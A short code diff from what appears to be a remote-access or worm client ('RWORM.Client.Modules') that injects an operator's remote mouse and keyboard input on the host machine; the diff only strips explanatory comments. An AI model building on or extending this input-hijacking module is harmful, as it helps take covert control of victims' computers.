@@ -33,7 +33,7 @@ namespace RWORM.Client.Modules
         private const int SM_CXSCREEN = 0;
         private const int SM_CYSCREEN = 1;
 
-        // mouse_event flags
+        
         private const uint MOUSEEVENTF_MOVE = 0x0001;
         private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
         private const uint MOUSEEVENTF_LEFTUP = 0x0004;
@@ -43,7 +43,7 @@ namespace RWORM.Client.Modules
         private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
         private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
 
-        // keybd_event flags
+        
         private const uint KEYEVENTF_KEYDOWN = 0x0000;
         private const uint KEYEVENTF_KEYUP = 0x0002;
 
@@ -158,10 +158,10 @@ namespace RWORM.Client.Modules
             _cts?.Cancel();
         }
 
-        /// <summary>
-        /// Handles remote mouse/keyboard interaction payload from the operator viewer.
-        /// Payload format: "mouse\x00action\x00x\x00y\x00button" or "key\x00action\x00vk"
-        /// </summary>
+        
+        
+        
+        
         public static void HandleInput(string payload)
         {
             try
@@ -181,7 +181,7 @@ namespace RWORM.Client.Modules
                     switch (action)
                     {
                         case "move":
-                            // SetCursorPos is sufficient
+                            
                             break;
                         case "down":
                             if (button == 1) mouse_event(MOUSEEVENTF_LEFTDOWN, targetX, targetY, 0, UIntPtr.Zero);
